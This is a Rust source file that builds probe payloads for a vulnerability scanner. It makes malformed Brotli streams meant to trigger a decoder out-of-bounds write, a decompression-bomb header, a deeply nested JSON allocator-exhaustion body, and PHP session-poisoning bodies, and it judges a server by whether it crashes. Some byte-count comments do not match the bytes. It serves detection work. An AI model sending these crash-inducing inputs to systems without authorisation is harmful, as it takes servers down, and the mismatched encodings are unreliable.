//! Probe payload builders.
//!
//! Brotli stream construction is based on RFC 7932. The vulnerability class
//! (CVE-2026-111497) is an OOB write triggered by an impossible distance-block
//! type switch in google/brotli's decoder (`c/dec/decode.c`).
//!
//! Detection strategy: send streams that exercise the block-switch code path
//! with invalid type indices. Patched decoders return a clean HTTP error;
//! unpatched decoders crash (connection reset / 502).

use bytes::Bytes;

// ─────────────────────────────────────────────────────────────
// Brotli probe payloads
// ─────────────────────────────────────────────────────────────

/// Probe A — Truncated stream.
///
/// Only contains a valid WBITS header (byte 0) and nothing else.
/// Every decoder rejects this with an error; the question is *how*.
/// - Patched : clean HTTP 400 / error response
/// - Unpatched: may trigger early-exit OOB path → crash signal
pub fn brotli_truncated() -> Bytes {
    // 0x1b: WBITS encoding — sets 22-bit window (4 MB). Valid header, no data.
    Bytes::from_static(&[0x1b, 0x00])
}

/// Probe B — Invalid distance-block-type switch seed (22 bytes).
///
/// Structure (bit-oriented Brotli format, RFC 7932):
///   [0x1b]     — WBITS = 22 (4MB window), valid
///   [0x00]     — meta-block header: ISLAST=0
///   [0x00,0x1c]— MLEN (declares 4-byte uncompressed block)
///   [0x03]     — NBLTYPESD = 4 (declare 4 distance block types)
///   [0xff,0x03]— block type switch selector: request type 255 (>> NBLTYPESD)
///                this is the OOB trigger in the distance block type array
///   [rest]     — padding to 22 bytes, keeps decoder in active parse state
///
/// Patched (Brotli >= 1.2.1): range check catches type 255 → clean error
/// Unpatched:               : decoder writes OOB → process crash
pub fn brotli_invalid_distance_block_switch() -> Bytes {
    Bytes::from_static(&[
        0x1b,             // WBITS = 22, valid window header
        0x00,             // meta-block: ISLAST=0 ISLASTEMPTY=0
        0x00, 0x1c,       // MLEN = 4 (4-byte uncompressed claim)
        0x03,             // NBLTYPESD = 4 (four declared distance block types)
        0xff, 0x03,       // block type switch → type 255 (far exceeds NBLTYPESD)
        0x00, 0x00, 0x00, // command block header padding
        0x00, 0x00, 0x00, // insert-copy length fields
        0x00, 0x00, 0x00, // literal padding
        0x00, 0x00, 0x00, // distance context padding
        0x00, 0x00, 0x00, // ring buffer padding
        // 22 bytes total
    ])
}

/// Probe C — Differential: valid minimal Brotli followed by invalid extension.
///
/// Sends a complete (tiny) valid Brotli stream then appends malformed bytes.
/// Tests whether the decoder is lenient about trailing garbage.
/// Patched: returns error or 400 for malformed extension
/// Unpatched: may parse into the OOB region on the trailing block switch
pub fn brotli_valid_then_malformed() -> Bytes {
    let mut buf = Vec::new();
    // Minimal valid empty Brotli stream: window=16, last empty meta-block
    // 0x06: WBITS=16(default), ISLAST=1, ISLASTEMPTY=1 → valid empty stream
    buf.extend_from_slice(&[0x06]);
    // Now append invalid block-switch bytes after the stream end
    buf.extend_from_slice(&[
        0xff, 0x03,       // invalid block type switch
        0x00, 0x00, 0x00,
        0xff, 0xff, 0xff,
    ]);
    Bytes::from(buf)
}

/// Probe D — Decompression bomb pattern (small stream, claims huge output).
///
/// Brotli decompression bombs are distinct from the OOB bug but were observed
/// in the wild alongside CVE-2026-111497 exploitation attempts (Zscaler ThreatLabz).
/// Useful as a fingerprinting signal: patched servers typically have size limits;
/// unpatched may attempt to allocate the claimed size.
pub fn brotli_decompression_claim() -> Bytes {
    // Header claiming ~1 GB uncompressed but providing no data
    // MLEN encoding: MNIBBLES = 6 → MLEN uses 6 nibbles (24 bits)
    // 0xFFFFFF = 16,777,215 bytes claimed
    Bytes::from_static(&[
        0x1b,             // WBITS = 22
        0x00,             // ISLAST = 0
        0x0c,             // MNIBBLES = 6 (encodes 24-bit MLEN)
        0xff, 0xff, 0xff, // MLEN = 16,777,215 bytes
        0x00,             // truncated — no actual data
    ])
}

// ─────────────────────────────────────────────────────────────
// PHP2Shell probe bodies
// ─────────────────────────────────────────────────────────────

/// OOM-pressure body: deeply nested JSON designed to stress PHP's allocator.
/// CVE-2026-109618: OOM during request parsing leaves state half-initialized.
/// Patched  → clean 500 with error body (allocation failure handled)
/// Unpatched → worker crash → connection reset / 502
pub fn php_oom_pressure_body(depth: usize) -> Vec<u8> {
    let mut s = String::with_capacity(depth * 5 + 4);
    for _ in 0..depth {
        s.push_str("{\"x\":");
    }
    s.push_str("1");
    for _ in 0..depth {
        s.push('}');
    }
    s.into_bytes()
}

/// Stale-state poison body for CVE-2026-109619.
/// Sends a specific form field that influences PHP FPM worker globals.
/// The second request (plain GET) checks whether state leaked.
pub fn php_stale_poison_body() -> Vec<u8> {
    // POST body: set a distinguishable cookie/session value
    // that a subsequent request on the same worker might echo
    b"SHELLPROOF_STALE_MARKER=VES_PROBE_2026&_sp=1".to_vec()
}

/// Session upload-progress body for CVE-2026-115560.
/// If session.upload_progress.enabled is ON, PHP writes attacker-controlled
/// key material into the session file. The session key is the value of
/// session.upload_progress.name (default: PHP_SESSION_UPLOAD_PROGRESS).
pub fn php_session_upload_progress_body(session_key: &str) -> (String, Vec<u8>) {
    let boundary = "shellproof_boundary_0x4e4f4445";
    let body = format!(
        "--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\nSHELLPROOF_PROBE_2026\r\n--{b}--\r\n",
        b = boundary,
        k = session_key,
    );
    let content_type = format!("multipart/form-data; boundary={}", boundary);
    (content_type, body.into_bytes())
}
